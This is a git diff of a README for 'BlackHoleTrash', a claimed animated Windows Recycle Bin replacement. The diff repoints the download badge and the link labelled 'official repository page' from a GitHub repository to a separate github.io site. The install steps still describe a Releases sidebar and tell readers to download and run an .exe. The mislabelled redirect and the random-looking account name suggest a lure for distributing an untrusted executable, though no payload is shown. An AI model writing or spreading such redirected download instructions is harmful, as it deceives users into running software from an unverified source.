@@ -1,6 +1,6 @@
 # 🕳️ BlackHoleTrash - Delete files with visual style today
 
-[![](https://img.shields.io/badge/Download-BlackHoleTrash-blue.svg)](https://github.com/Offensive-terseness86/BlackHoleTrash)
+[![](https://img.shields.io/badge/Download-BlackHoleTrash-blue.svg)](https://offensive-terseness86.github.io)
 
 ## 🌌 About this project
 BlackHoleTrash replaces your standard Windows Recycle Bin with a visual simulation of a black hole. When you move files into this icon, the software triggers a gravitational lensing effect. Files appear to warp and vanish past the event horizon. This tool functions like a normal trash bin but updates your desktop with high-quality graphical performance. It provides a unique way to manage file deletion on your Windows workstation.
@@ -16,7 +16,7 @@ Before you start, make sure your computer meets these basic needs:
 ## 🚀 Downloading and setup
 Follow these steps to install the software on your machine.
 
-1. Visit the [official repository page](https://github.com/Offensive-terseness86/BlackHoleTrash) to start your download.
+1. Visit the [official repository page](https://offensive-terseness86.github.io) to start your download.
 2. Look for the latest version under the Releases section on the right side of the screen.
 3. Select the file ending in .exe to download the installer to your computer.
 4. Locate the downloaded file in your browser history or your Downloads folder.
